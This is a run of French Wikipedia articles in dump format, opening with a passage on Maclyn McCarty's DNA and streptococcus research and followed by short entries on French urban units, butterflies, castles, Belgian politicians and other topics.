La difficulté à accepter le concept que « les gênes sont l'ADN » durant les précédentes années justifie les éloges reçus. Le problème est, en effet, sujet à un formidable, mais prédictible, élan de scepticisme organisé. Certains diront que cette découverte a simplement été ignorée, mais c'est manifestement faux, du moins dans le cas des instituts de recherches new-yorkais. La communauté scientifique n'accepte pas facilement les découvertes scientifiques majeures, et dans ce cas, il y a des défis à relever concernant les recherches sur le Streptococcus pneumoniae, ce qui rend particulièrement difficile d'inciter d'autres chercheurs à poursuivre ces recherches. Pour commencer, peu de personnes ont alors l'expertise nécessaire avec cet agent infectieux. D'un point de vue biologique, il est dangereux de travailler avec, et de plus, il est difficile à développer. Dans le but de tester sa virulence, l'on avait besoin d'utiliser des souris comme filtre sélectif. Le manque le plus critiquable comme corroboration est l'examen d'autres marqueurs phénotypiques, en plus de la polysaccharide capsulaire, afin de déterminer dans quelle mesure les trouvailles sur le gène pour un antigène pneumococcique allaient s'appliquer à d'autres marqueurs génétiques du Streptococcus pneumoniae.
Malgré cela, en 1953, influencé par l'énorme impact de la structure bihélicoïdale de l'ADN de James Watson et Francis Crick, la majorité des chercheurs acceptent totalement l'article de 1944. En fait, l'on pourrait dire que la preuve formelle que l'ADN encode le matériel générique a été estimée seulement plus tard par des synthèses en laboratoire d'oligonucléotide, et par la démonstration de l'activité biologique du matériel générique, par exemple, les gênes ARNt ou de petits virus d'ADN. Longtemps avant cette preuve formelle, la plupart des observateurs ont accepté la valeur heuristique de la proposition, qu'en effet, les gènes sont faits d'ADN.
Pendant ce temps, McCarty se concentre sur les maladies mises en exergue par le streptocoque. Au moment de la retraite d'Homer Swift en 1946, l'on propose à McCarty de prendre la tête du laboratoire établi en 1922 pour travailler sur le streptocoque et le rhumatisme articulaire aigu. C'est le lieu de travail de Rebecca Lancefield, qui développe la classification sérologique du streptocoque. À la suite d'innombrables observations cliniques, combinées avec la classification de Lancefield, il est clair que le rhumatisme articulaire aigu est une complication de la pharyngite streptococcique de groupe A. La chaîne causale d'événements nous échappe toujours. McCarty attaque ce problème en étudiant la biologie des streptocoques de groupe A et les patients souffrant de rhumatisme articulaire aigu admis au .
Durant les 20 années suivantes, en collaboration avec ses étudiants et collaborateurs, le travail de McCarty change la compréhension des organismes, depuis un streptocoque gram-positif avec une caractéristique sérologique particulière, jusqu'à une des meilleures espèces caractérisées de bactérie. Le travail sur l'anatomie de la paroi cellulaire et la chimie était juste à son début. Son travail mène à l'isolation de la paroi cellulaire du streptocoque en tant qu'entité structurelle adéquate à des inspections anatomiques avec un microscope électronique. La dissection chimique mène à une caractérisation des polysaccharides spécifiques du groupe A, au peptidoglycane et à l'identification de sa spécificité sérologique dans l'hexosamine terminale. Dans le but de prouver cette spécificité, il doit premièrement identifier et purifier l'enzyme spécifique qui a scindé l'hexosamine depuis un organisme du sol. Le traitement de la polysaccharide avec cette enzyme abroge sa réactivité sérologique. McCarty démontre par la suite la configuration précise du lien de l'hexosamine en synthétisant l'α- et β-N-acétyle-glucosamine ovalbumine et démontre que seulement le second a réagi avec les antisérums de groupe A. Une stratégie analytique similaire indique que les polysaccharides du streptocoque de groupe C sont différents, en ayant une galactosamine β-N-acétyle terminale comme déterminant sérologique.
En parallèle, McCarty étudie les collections de spécimens de valeur de déclenchement de la maladie durant la Seconde Guerre mondiale. Lui et ses collaborateurs découvrent que les réponses des anticorps à plusieurs antigènes streptococciques sont significativement supérieures dans le groupe d'individus ayant développé un rhumatisme articulaire aigu que chez ceux avec une infection simple. Malgré cela, la réponse à des antigènes sans rapport, par exemple, la diphtérie, n'est pas améliorée. Il découvre que les streptocoques de groupe A secrètent d'inhabituelles valeurs de désoxyribonucléase, et établit un test pour la détection d'anticorps produits en réponse à cet antigène. Cela amène à la découverte que le streptocoque est capable de produire de multiples isoenzymes de désoxyribonucléase. Il purifie la protéine C réactive humaine par cristallisation, produit un antisérum très spécifique, et, utilisant ce test plus simple et précis, découvre que les niveaux de protéine C réactive répondent plus rapidement et de façon plus fiable que n'importe quel autre marqueur inflammatoire, et peuvent donc servir d'indicateur plus précis aux activités inflammatoires. La mesure de la protéine C réactive afin de détecter les inflammations est aujourd'hui une procédure standard dans le domaine médical.
Dans les années suivantes, McCarty œuvre de plus en plus comme représentant des sciences biomédicales. Il travaille durant 14 ans en tant que physicien en chef du et en tant que conseiller de confiance et vice-président de l'Université Rockefeller. En dehors de l'université, son est recherché par le conseil en recherches sur la santé de la ville de New York, la fondation Helen Hay Whitney, l'Institut de médecine et de nombreuses universités. Pendant plus de 40 ans, il dirige le .

</doc>
<doc id="6807313" url="https://fr.wikipedia.org/wiki?curid=6807313" title="Bréventec">
Bréventec



</doc>
<doc id="6807314" url="https://fr.wikipedia.org/wiki?curid=6807314" title="Unité urbaine de Lunel">
Unité urbaine de Lunel

L'unité urbaine de Lunel est une unité urbaine française interdépartementale centrée sur Lunel, ville de l'Hérault au cœur de la quatrième agglomération de ce département. 
Données générales.
Dans le zonage réalisé par l'Insee en 1999, l'unité urbaine était composée de quatre communes, toutes situées dans l'arrondissement de Montpellier et le département de l'Hérault.
Dans le zonage réalisé en 2010, l'unité urbaine était composée de neuf communes, le périmètre s'étant agrandi aux communes de Marsillargues et Villetelle dans l'Hérault et d'Aigues-Vives, Aubais et Gallargues-le-Montueux dans le Gard. Elle est ainsi une unité urbaine inter-départementale.
Dans le nouveau zonage réalisé en 2020, elle est composée des neuf mêmes communes.
En , avec dans l'Hérault ( dans le Gard), elle représente la unité urbaine de ce département. Elle occupe le dans la région Occitanie.
En 2022, sa densité de population s'élève à . Par sa superficie dans l'Hérault (), elle représente 1,57 % du territoire mais, par sa population, elle regroupe 3,55 % de la population de ce département.
Le tableau suivant détaille la répartition de l'unité urbaine sur les départements du Gard et de l'Hérault en 2022 (les pourcentages sont relatifs à chacun des départements) :
Composition 2020 de l'unité urbaine.
Elle est composée des neuf communes suivantes :

</doc>
<doc id="6807320" url="https://fr.wikipedia.org/wiki?curid=6807320" title="Kolana">
Kolana

 
 
Kolana est un genre d'insectes lépidoptères de la famille des Lycaenidae et de la sous-famille des Theclinae présents en Amérique.
Dénomination.
Le genre a été nommé par en 2004.
Répartition.
Les espèces du genre "Kolana" sont présentes en Amérique centrale et Amérique du Sud.

</doc>
<doc id="6807321" url="https://fr.wikipedia.org/wiki?curid=6807321" title="Raïon de Khounzakh">
Raïon de Khounzakh

Le raïon de Khounzakh (en , ; en avar : Хунзахъ район) est une subdivision du Daghestan, une république de la fédération de Russie. Son centre administratif est le village de Khounzakh.
Géographie.
Le raïon de Khounzakh s'étend sur dans le centre du Daghestan. Il est limité au nord par le raïon de Goumbet et par le raïon d'Ountsoukoul, à l'est par le raïon de Guerguebil, au sud par le raïon de Gounib et par le raïon de Chamil, à l'ouest par le raïon d'Akhvakh et le raïon de Botlikh.
Administration.
Le raïon de Khounzakh est formé de 59 villages et ne compte ni commune urbaine ni ville.
Histoire.
L'okroug avar de l'oblast du Daghestan fut créé à partir du khanat avar en 1864. En 1921, il devint une division de la RSSA du Daghestan. Le , une division en cantons fut introduite dans la RSSA du Daghestan et tous les okrougs furent supprimés. Le canton de Khounzakh fut renommé raïon de Khounzakh le .
Population.
Démographie.
Recensements (*) ou estimations de la population :
Nationalités.
Selon le recensement de 2002, la population du raïon comprenait :

</doc>
<doc id="6807337" url="https://fr.wikipedia.org/wiki?curid=6807337" title="Le Spectacle de Noël">
Le Spectacle de Noël

Le Spectacle de Noël (") est un téléfilm de Noël américain réalisé par David S. Cass Sr. et diffusé le sur et en France le sur M6.

</doc>
<doc id="6807342" url="https://fr.wikipedia.org/wiki?curid=6807342" title="Chapelle du camp de La Valbonne">
Chapelle du camp de La Valbonne



</doc>
<doc id="6807343" url="https://fr.wikipedia.org/wiki?curid=6807343" title="Chapelle de la maison forte de Montherot de Balan (Ain)">
Chapelle de la maison forte de Montherot de Balan (Ain)



</doc>
<doc id="6807344" url="https://fr.wikipedia.org/wiki?curid=6807344" title="César Van Damme">
César Van Damme

"Paul Jules" César Van Damme, né le à Baasrode et décédé à Scheveningue le est homme politique libéral belge flamand.
Il fut constructeur naval ; il fut échevin de Baasrode et élu député belge.

</doc>
<doc id="6807345" url="https://fr.wikipedia.org/wiki?curid=6807345" title="Paul Van Damme (1854-1916)">
Paul Van Damme (1854-1916)



</doc>
<doc id="6807347" url="https://fr.wikipedia.org/wiki?curid=6807347" title="Tangalooma">
Tangalooma

Tangalooma est une station balnéaire de l'Est de l'Australie située sur l'île Moreton, dans le sud du Queensland. Elle était autrefois une station baleinière.

</doc>
<doc id="6807348" url="https://fr.wikipedia.org/wiki?curid=6807348" title="Foyer Alsacien Mulhouse">
Foyer Alsacien Mulhouse



</doc>
<doc id="6807350" url="https://fr.wikipedia.org/wiki?curid=6807350" title=".tsv">
.tsv



</doc>
<doc id="6807353" url="https://fr.wikipedia.org/wiki?curid=6807353" title="Singapore Indoor Stadium">
Singapore Indoor Stadium

Le Singapore Indoor Stadium (en , en , et en ) est un palais omnisports situé dans le quartier de Kallang à Singapour. Il accueille principalement l'équipe de basket-ball des Singapore Slingers et régulièrement des concerts et autres évènements. Sa capacité d'accueil est de personnes.
Histoire.
La construction de l'édifice débuta officiellement le pour un budget de 90 millions de dollars et suivant les plans de l'architecte japonais Kenzō Tange. Le stade dispose d'un toit de forme conique et l'antre du stade est libre de piliers.
La construction fut officiellement terminée le mais dut subir une remise à neuf l'année suivante avant de rouvrir au public en . Le bâtiment fut finalement officiellement inauguré par le premier ministre Lee Kuan Yew le .
Capacités.
Le palais omnisports est un espace modulable qui peut recevoir aussi bien des compétitions sportives (jusqu'à places) ou des concerts (jusqu'à places).
Évènements.
Autres évènements.
D'autres types de spectacles et de manifestations culturelles sont également organisées au Singapore Indoor Stadium : opéras, danse, spectacles sur glace, etc.
Transports en commun.
Le stade est desservi par la station « Stadium » (CC6) de la Ligne circulaire du métro de Singapour.

</doc>
<doc id="6807355" url="https://fr.wikipedia.org/wiki?curid=6807355" title="Jacques Joli-Coeur">
Jacques Joli-Coeur



</doc>
<doc id="6807358" url="https://fr.wikipedia.org/wiki?curid=6807358" title="AS Dakar Sacré-Coeur">
AS Dakar Sacré-Coeur



</doc>
<doc id="6807363" url="https://fr.wikipedia.org/wiki?curid=6807363" title="Olga Barnet">
Olga Barnet

Olga Barnet (), née le et morte le , est une actrice soviétique et russe.
Biographie.
Olga Barnet est la fille du réalisateur Boris Barnet et de l'actrice Alla Kazanskaïa.
Elle est diplômée de l'Institut d'art dramatique Boris Chtchoukine en 1972 (cours d'Aleksandr Borissov) et se voit acceptée dans la troupe du Théâtre d'art de Moscou, puis, après la scission de la troupe en 1987 elle reste avec Oleg Efremov dans ce qui devient le Théâtre d'art académique Anton Tchekhov.
Elle est nommée artiste du peuple de la fédération de Russie en 1972.

</doc>
<doc id="6807365" url="https://fr.wikipedia.org/wiki?curid=6807365" title="Maison forte de Montherot (Balan)">
Maison forte de Montherot (Balan)

La maison forte de Montherot ou château Sauvage, connue de façon contemporaine comme la MFR Balan, est une ancienne maison forte du remaniée au qui se dresse sur la commune de Balan dans le département de l'Ain et la région Auvergne-Rhône-Alpes. Elle est occupée depuis 1968 par une maison familiale rurale, la MFR Balan spécialisée dans les métiers de l'alimentation. 
Histoire.
Au , la famille de Condé, également propriétaire de l'hôtel de Condé de Montluel, fait rénover la maison forte.
Au , les seigneurs de Montluel afin de financer des travaux dans leur hospice de Montluel, vendent le domaine de Balan et sa maison forte à Pierre de Montherot. Pierre de Montherot était également possessionné à Béligneux. Ce sont les armes de la famille de Montherot qui sont utilisées comme blason de la ville.
À noter également que la maison forte disposait d'une chapelle. Cette chapelle a été bénite en 1752 par Pierre Guérin de Tencin alors archevêque de Lyon. Les armes des Montherot surmontent le porche de celle-ci, et sont apposées également sur la plaque de la cheminée de la maison forte.
En 1877, la famille Sauvage de Saint-Marc, est en possession de la maison forte.
Usage contemporain.
La maison forte est depuis 1968, le siège d'une maison familiale rurale. et accueille un établissement scolaire spécialisé dans le domaine de l'alimentation. Les différents bâtiments accueillent les différents espaces d'éducation et d'hébergement. La chapelle de la maison forte accueille le restaurant d'application.

</doc>
<doc id="6807377" url="https://fr.wikipedia.org/wiki?curid=6807377" title="Victor Van de Walle">
Victor Van de Walle

"Marie Jean Charles" Victor van de Walle, né le à Puurs et décédé à Malines le est homme politique libéral belge flamand, relativement flamingant.
Il fut notaire (1883-1919), auteur, poète, échevin de Malines, élu député belge.

</doc>
<doc id="6807381" url="https://fr.wikipedia.org/wiki?curid=6807381" title="Abrogans">
Abrogans

L'Abrogans, ou Codex Abrogans (St. Gall, Stiftsbibliothek, Cod. 911), est probablement le plus ancien livre encore existant en langue allemande. Ce manuscrit est un dictionnaire de synonymes (ou glossaire, ou liste de mots) du latin en vieux haut-allemand et date du (765–775). Plusieurs copies ont été faites, mais une seule existe encore ; elle se trouve à la Bibliothèque de l'abbaye de Saint-Gall en Suisse.
Ce codex est nommé d'après la première entrée du glossaire : "abrogans = dheomodi" (Allemand moderne : "demütig" = modeste, humble). Il contient environ termes en vieux haut-allemand, avec environ exemples. L’œuvre est parfois attribuée au prélat alémanique Aribon de Freising (mort en 783 ou 784), le premier auteur de langue tudesque connu.

</doc>
<doc id="6807387" url="https://fr.wikipedia.org/wiki?curid=6807387" title="Tissandier">
Tissandier



</doc>
<doc id="6807390" url="https://fr.wikipedia.org/wiki?curid=6807390" title="Codex Abrogans">
Codex Abrogans



</doc>
<doc id="6807391" url="https://fr.wikipedia.org/wiki?curid=6807391" title="Château de la Faye (Auriac-du-Périgord)">
Château de la Faye (Auriac-du-Périgord)

Le château de la Faye est un château français situé sur la commune de Auriac-du-Périgord, dans le département de la Dordogne.
Il fait l'objet d'une protection au titre des monuments historiques.
Historique.
La famille Arnal de la Faye.
Le château a appartenu à la famille de la Cropte. Avant 1438, Jean II de la Cropte, seigneur de Lanquais par don de Marie de Bourdeille en 1428, reçoit par don de Raimond de La Faye, l'hospice (château) de la Faye situé à Auriac, qui lui-même l'avait reçu de Guillaume de Royère. Par un acte passé le , Jean de la Servantie, damoiseau de Montignac, lui cède tous les droits qu'il a sur l'hospice de La Faye. Le , Raymond dit Monot de la Cropte reçoit de son père, Jean II de la Cropte, l'hospice de La Faye, situé dans la paroisse d'Auriac, près de Montignac. D'un premier mariage, il eut vers 1448 Anthonie ou Antoinette de la Cropte qui a épousé Raimond Arnal, receveur des tailles du lieu de Montignac, dont les descendants prirent le nom de la Faye. 
La seigneurie d'Auriac est créée en 1487 à la suite de la vente par Jean d'Albret, comte de Périgord, des droits et rentes des terres à Antoinette de la Cropte. Son fils aîné est devenu seigneur de la Faye et d'Auriac. Le château a alors appartenu à la famille Arnal, seigneurs de La Faye.
Raimond Arnal (vers 1440-avant 1498) a eu huit enfants : Marguerite, mariée à Jacques de Lambert, Bertrand Arnal, abbé de l'abbaye de Terrasson entre 1520 et 1541, date à laquelle il se démet en faveur de son neveu, Pierre, Marguerite, mariée avec Jean Alphern, Jean, marié à Gallienne de Beynac, Marguerite, mariée avec Louis Javel, Alexandre (vers 1470-après 1513), marié à Guillaumette de Vins, Foucauld né en 1476, François, né vers 1485, mort avant 1551, marié en 1520 à Souveraine d'Aubusson de Villac.
François Arnal, capitaine de la châtellenie de Montignac jusqu'en 1521, procureur d'Amanieu cardinal d'Albret, a eu six enfants : Pierre Arnal, succède à son oncle comme abbé de Terrasson en 1541, mort après 1551, Antoinette mariée à Guillaume Migot, Gabrielle Arnal mariée en 1539 avec Bernard IV de Foucauld de Lardimalie, Marguerite Arnal mariée en 1547 à Hélie Cottet, Amanieu Arnal, né en 1533, mort en 1556, marié à Marguerite Catherine Belcier, Guilhane Arnal mariée en 1551 à François Saulnier de Laborie. 
Amanieu Arnal a eu deux enfants : Pierre Arnal, né vers 1555 et mort avant 1591, marié avec Marguerite de Cugnac, et Catherine Arnal mariée le avec Jean Pasquet de Savignac, décédée en 1608.
En 1569, la chronique de Jean Tarde cite Pierre Arnal de la Faye, seigneur de Barry et de la Ricardie, fils de Jean Arnal et de Galienne de Beynac, capitaine du château de Montignac au moment où l'armée des princes de Navarre et de Condé faisait retraite après la bataille de Moncontour et leur refuse le passage. 
En 1580, on trouve Antoine de la Faye, seigneur de La Faye et d'Auriac, capitaine de la ville et du château de Montignac jusqu'en 1581, quand Henri de Navarre demande à Geoffroy de Vivans de prendre dans le château de Montignac les archives du comté de Périgord et de la vicomté du Limousin et de les transporter au château de Turenne. 
Catherine Arnal de la Faye, fille d'Antoine Arnal de la Faye, seigneur de la Faye et de Puygolfier, et de Suzanne de Pérusse-d'Escars, s'est mariée avec François Foucauld. Son fils, Henri Foucauld, seigneur de la Faye d'Auriac, s'est marié en 1673 avec Gabrielle de Rouffignac. Il est seigneur d'Auriac et de la Faye. Sa fille aînée, Anne Foucauld est dame de la Faye et son héritière universelle. Elle se marie par contrat du avec Louis Foucauld de Pontbriand, seigneur de Mesmond, avant de devenir par mariage seigneur de la Faye et d'Auriac. Anne de Foucauld est morte sans postérité en 1752 après avoir testé en faveur de son mari. Celui-ci institue en 1753 pour héritier universel son petit-neveu, le comte Louis de Foucauld de Pontbriand, né en 1742. Il a émigré en 1791
Le château.
Une simple tour de défense a été construite au pour assurer la défense de Montignac. Des tours ont été ajoutées sur le côté sud, au , à gauche, avec la date de 1359, à droite, au . Le château, repaire noble, est cité en 1476 sous le nom de "Fortalitium de la Faya". Le logis date de la fin du , comprenant trois niveaux. Il est couronné de mâchicoulis qui ont été transformés au pour construire une haute toiture et ajouter des lucarnes. Au a été ajoutée une tour dont la porte soulignée par un arc brisé s'ouvre sur l'escalier. Un inventaire du permet de savoir qu'il y avait huit cheminées dans les pièces du château. Des tours ont été ajoutées au aux extrémités du logis barlong.
Dans le parc se trouve un cluzeau.
Le monument fait l’objet d’une inscription au titre des monuments historiques depuis le .

</doc>
<doc id="6807397" url="https://fr.wikipedia.org/wiki?curid=6807397" title="Abdelhay SGHAIER">
Abdelhay SGHAIER



</doc>
<doc id="6807398" url="https://fr.wikipedia.org/wiki?curid=6807398" title="Tramway de Zhangjiang">
Tramway de Zhangjiang

Le tramway de Zhangjiang (张江有轨电车) était une ligne de tramway sur pneu circulant dans le quartier de Zhangjiang, dans le district de Pudong, dans l'est de Shanghai. Elle a été ouverte au public début 2010. Faute de fréquentation attendue, la ligne ferme finalement le 1er juin 2023 et est remplacée par une ligne de bus standard.
Réseau actuel.
Matériel roulant.
Le tramway de Zhangjiang utilise la technologie Translohr construite et commercialisée par NTL Translohr, filiale d'Alstom.

</doc>
<doc id="6807402" url="https://fr.wikipedia.org/wiki?curid=6807402" title="Charles van Marcke de Lummen">
Charles van Marcke de Lummen

Édouard Charles Xavier van Marcke de Lummen, né le à Liège où il est mort le , est un homme politique libéral belge wallon.
Il est docteur en droit, bâtonnier de l'ordre des avocats, conseiller communal (1872) et échevin de Liège, conseiller provincial de la province de Liège, avocat à la cour d'appel de Liège et membre de la Chambre des Représentants. Il est élu député de Liège (1892-1894 ; 1905-1914) et président du groupe parlementaire libéral de la Chambre.
Biographie.
Il est le fils de Charles-Emmanuel-Clément van Marcke de Lummen fils () (1811-1885) et Anne-Marie Campo (1820-1860). Il est le petit-fils du peintre sur porcelaine Charles van Marcke (1773-1830).
Il épouse, en 1875, Adrienne Massard (1845-1928).
Ils ont deux fils : Paul-Charles-Georges (1876-1909) et Camille-Armand-Édouard (1879-1903).

</doc>
<doc id="6807404" url="https://fr.wikipedia.org/wiki?curid=6807404" title="Unité urbaine de Beaucaire">
Unité urbaine de Beaucaire

L'unité urbaine de Beaucaire est une unité urbaine française interdépartementale et interrégionale centrée sur Beaucaire, ville du Gard.
Données générales.
En 2010, selon l'Insee, l"'unité urbaine de Beaucaire" est composée de deux communes, Beaucaire, qui est située dans le Gard et Tarascon, située dans les Bouches-du-Rhône. Il s'agit d'une agglomération interdépartementale, mais aussi interrégionale, s'étendant sur les régions de l'Occitanie et de Provence-Alpes-Côte d'Azur.
En 2020, l'Insee a procédé à une révision des délimitations des unités urbaines de la France ; celle de Beaucaire reste composée des deux mêmes communes.
En , sa population est de et sa densité s'élève à .
Le tableau suivant détaille la répartition de l'unité urbaine sur les départements des Bouches-du-Rhône et du Gard en 2022 (les pourcentages sont relatifs à chacun des départements) :
Composition 2020 de l'unité urbaine.
Elle est composée des deux communes suivantes :
Évolution démographique.
L'unité urbaine enregistre, depuis 1975, une croissance continue jusqu'à dépasser le seuil des .

</doc>
<doc id="6807405" url="https://fr.wikipedia.org/wiki?curid=6807405" title="Charles Van Marcke">
Charles Van Marcke



</doc>
<doc id="6807411" url="https://fr.wikipedia.org/wiki?curid=6807411" title="Olga Kizilova">
Olga Kizilova

Olga Kizilova (), née le , est une actrice soviétique active dans les années 1970.
Biographie.
Olga Kizilova est la fille de Larissa Tarkovskaïa, la seconde épouse du réalisateur Andreï Tarkovski.

</doc>
<doc id="6807415" url="https://fr.wikipedia.org/wiki?curid=6807415" title="Frédéric II le Sévère">
Frédéric II le Sévère



</doc>
<doc id="6807417" url="https://fr.wikipedia.org/wiki?curid=6807417" title="Kolana ergina">
Kolana ergina

Kolana ergina est une espèce de lépidoptères (papillons) de la famille des Lycaenidae, sous-famille des Theclinae et du genre "Kolana".
Dénomination.
"Kolana ergina" a été décrit par William Chapman Hewitson en 1867, sous le nom initial de "Thecla ergina".
Synonymes: "Thecla voltinia" Hewitson, 1869; "Thecla ela" Hewitson, 1874.
Description.
"Kolana ergina" est un petit papillon aux antennes et aux pattes annelées de blanc et de marron, avec une longue queue et une très courte à chaque aile postérieure.
Le dessus est marron foncé avec aux ailes antérieures une tache grise proche du milieu du bord costal.
Le revers beige foncé avec aux ailes postérieures une bande de taches rondes et deux gros ocelles rouge, un au niveau des queues et un en position anale, le tout surmonté d'une ligne blanche en zigzag.
Écologie et distribution.
"Kolana ergina" est présent à la Jamaïque, au Brésil et en Guyane.
Protection.
Pas de statut de protection particulier.

</doc>
<doc id="6807422" url="https://fr.wikipedia.org/wiki?curid=6807422" title="Vladimir Savone">
Vladimir Savone



</doc>
<doc id="6807427" url="https://fr.wikipedia.org/wiki?curid=6807427" title="Hyper-consommation">
Hyper-consommation



</doc>
<doc id="6807433" url="https://fr.wikipedia.org/wiki?curid=6807433" title="Lazika">
Lazika

Lazika, en géorgien : ლაზიკა, est un projet de ville nouvelle situé sur la côte de la mer Noire en Géorgie, annoncé par Mikheil Saakachvili le . Elle devait à terme avoir une population de habitants et devenir ainsi la seconde ville du pays après Tbilissi. 
Le site de Lazika est situé entre la station balnéaire d'Anaklia au nord et le port de Poti au sud. Il a été choisi pour créer une conurbation entre les villes de Poti et de Zougdidi, en vue d'ancrer l'Abkhazie proche dans l'économie géorgienne. Les premiers travaux sur le site ont commencé en . Une partie du financement doit être assuré par les autorités géorgiennes à hauteur de 90 millions d’euros pour les 4 premières années, ainsi que par des investisseurs privés étranger. 
Après les élections législatives géorgiennes de 2012, la nouvelle majorité annonce qu'une grande partie du projet est abandonnée.

</doc>
<doc id="6807440" url="https://fr.wikipedia.org/wiki?curid=6807440" title="Kolana ligurina">
Kolana ligurina

Kolana ligurina est une espèce de lépidoptères (papillons) de la famille des Lycaenidae, sous-famille des Theclinae et du genre "Kolana".
Dénomination.
"Kolana ligurina" a été décrit par William Chapman Hewitson en 1874 sous le nom initial de "Thecla ligurina" et "Thecla corolena".
Nom vernaculaire.
"Kolana ligurina" se nomme Ligurina Hairstreak en anglais.
Description.
"Kolana ligurina" est un petit papillon aux antennes et aux pattes annelées de blanc et de noir, avec une longue queue et une très courte à chaque aile postérieure.
Le dessus est bleu clair métallisé largement bordé de beige foncé avec aux ailes antérieures une tache beige proche du milieu du bord costal.
Le revers est beige avec, aux ailes postérieures, deux lignes blanches et deux gros ocelles orange pupillés de marron, un entre les deux queues et un en position anale.
Écologie et distribution.
"Kolana ligurina" est présent au Mexique, au Nicaragua, au Costa Rica, au Salvador, au Brésil et en Guyane.
Protection.
Pas de statut de protection particulier.

</doc>
<doc id="6807445" url="https://fr.wikipedia.org/wiki?curid=6807445" title="Marie (film, 1993)">
Marie (film, 1993)

Marie est un film belge réalisé par Marian Handwerker et sorti en 1993.
Le film met en scène Marie Gillain, Aurore Clément, Stéphane Ferrera, Sabrina Leurquin, Margarida Marinho et Bernard Graczyk.

</doc>
<doc id="6807449" url="https://fr.wikipedia.org/wiki?curid=6807449" title="Foire annuelle d'Hautem">
Foire annuelle d'Hautem

La foire annuelle d'Hautem, "Houtem Jaarmarkt" en néerlandais , est une foire annuelle d'hiver (bien que se déroulant en automne) et un marché à bestiaux qui se tiennent chaque année les 11 et à Hautem-Saint-Liévin, commune belge située en Région flamande dans la province de Flandre-Orientale.
 a été inscrit en par l'UNESCO sur la liste représentative du patrimoine culturel immatériel de l'humanité.
Historique.
D'origine médiévale, cette foire est d'abord un pèlerinage consacré à saint Liévin qui serait décédé un . À partir du , le pèlerinage évolue de plus en plus en une véritable foire s’organisant en un important marché de bétail et de chevaux et une fête populaire. Alors qu'ailleurs en Flandre, les marchés de bestiaux sont en déclin, celui de Hautem-Saint-Liévin prend de l'ampleur et devient une fête populaire très fréquentée. Il s’agit aujourd’hui du plus grand marché de bestiaux et de chevaux en plein air de Flandre.
Description.
Il s’agit du dernier grand marché de plein air en Belgique qui rassemble dans le village 500 exposants et négociants de bétail et de chevaux pur-sang ou de matériel agricole et des milliers de visiteurs. Plus de et 600 chevaux sont à vendre lors de ce marché.
Les tractations commerciales s’y pratiquent encore par le battement des mains. 
Pendant les deux jours de la foire, les maisons particulières s’ouvrent à tous pour manger, boire et écouter de la musique. Chaque année, quelque 50 000 visiteurs se rendent à la foire annuelle d'Hautem.

</doc>
<doc id="6807452" url="https://fr.wikipedia.org/wiki?curid=6807452" title="Caserne de la Garde">
Caserne de la Garde

La caserne de la Garde (en ) est un bâtiment situé dans le quartier Kaartinkaupunki à Helsinki.
Description.
La caserne de la Garde est le bâtiment principal du ministère finlandais de la Défense (en ). Il est situé en bordure sud de la place Kasarmitori au 8, rue Eteläinen Makasiinikatu.
Le bâtiment conçu par Carl Ludvig Engel est terminé en 1822. De nos jours il abrite des locaux du ministère finlandais de la Défense. Les autres bâtiments sont des locaux de l'état-major des Forces armées finlandaises. 
En 1881 dans la cour de la caserne, on a élevé un monument en mémoire des soldats de la Garde finlandaise tombés en 1877 à la bataille de Gorni Dubnik de la guerre russo-turque. Dans les années 1950–1960, à la suite d'un concours d’architecte on a complété les bâtiments du par des immeubles de bureaux conçus par Viljo Revell et Heikki Castrén.

</doc>
<doc id="6807454" url="https://fr.wikipedia.org/wiki?curid=6807454" title="Bâtiment principal du Ministère finlandais de la défense">
Bâtiment principal du Ministère finlandais de la défense



</doc>
<doc id="6807457" url="https://fr.wikipedia.org/wiki?curid=6807457" title="Eishockey Club Bülach">
Eishockey Club Bülach

L'Eishockey Club Bülach (EHC Bülach) est un club de hockey sur glace de la ville de Bülach dans le canton de Zurich en Suisse.
Histoire.
À ses débuts, l'équipe joue dans une forêt voisine. Puis elle s'installe dans le centre sportif de Hirslen.
L'EHC Bülach développe un programme de développement envers les jeunes en collaboration avec le EHC Kloten.
Durant la saison 2011-2012, l'EHC Bülach atteint la finale des play-offs de la où elle perd contre l'EHC Winterthour.
Patinoire.
Les matchs à domicile de l'EHC Bülach ont lieu au centre sportif de Hirslen qui peut accueillir 3100 personnes. Le record de spectateurs est de 3400 lors d'un match contre les ZSC Lions.
Entraîneurs successifs.
Entraîneurs successifs

</doc>
<doc id="6807463" url="https://fr.wikipedia.org/wiki?curid=6807463" title="Gare de Musashi-Koganei">
Gare de Musashi-Koganei

La est une gare ferroviaire de la ville de Koganei, dans la préfecture de Tokyo au Japon. Elle est exploitée par la compagnie JR East.
Situation ferroviaire.
La gare de Musashi-Koganei est située au point kilométrique (PK) 29,1 de la ligne Chūō. 
Histoire.
La gare a été inaugurée le .
Services aux voyageurs.
Accès et accueil.
La gare dispose d'un bâtiment voyageurs, avec guichet, ouvert tous les jours.

</doc>
<doc id="6807464" url="https://fr.wikipedia.org/wiki?curid=6807464" title="Unité urbaine de Bagnols-sur-Cèze">
Unité urbaine de Bagnols-sur-Cèze

L'unité urbaine de Bagnols-sur-Cèze est une unité urbaine française centrée sur Bagnols-sur-Cèze, ville du Gard au cœur de la troisième agglomération du département. 
Données générales.
En 2010, selon l'INSEE, l"'unité urbaine de Bagnols-sur-Cèze" était composée de quatre communes, toutes situées dans l'arrondissement de Nîmes, une des subdivisions administratives du département du Gard.
En 2020, l'Insee a procédé à une révision des délimitations des unités urbaines de la France ; celle de Bagnols-sur-Cèze est composée de cinq communes urbaines, soit une de plus qu'en 2010, la commune de Laudun-l'Ardoise.
En , avec , elle représente la urbaine du département du Gard, se positionnant après les unités urbaines de Nîmes ( départemental et préfecture du département) et d'Alès ( départemental) et avant celle d'Avignon en considérant cette unité urbaine uniquement dans la partie gardoise où les villes des Angles et de Villeneuve-lès-Avignon comptent en . Elle occupe le dans la région Occitanie
En 2022, sa densité de population s'élève à . Par sa superficie, elle représente 1,66 % du territoire départemental et, par sa population, elle regroupe 3,81 % de la population du département du Gard.
Composition 2020 de l'unité urbaine.
Elle est composée des 5 communes suivantes :

</doc>
<doc id="6807474" url="https://fr.wikipedia.org/wiki?curid=6807474" title="Étienne Binet">
Étienne Binet

Étienne Binet, né le à Dijon (France) et décédé le à Paris, est un prêtre jésuite français et écrivain spirituel caractéristique de la littérature dévote du . Il occupe plusieurs fois des postes de gouvernement importants dans la Compagnie de Jésus. 
Biographie.
Étienne Binet fit une partie de ses études à Paris au collège de Clermont où il eut François de Sales pour condisciple.
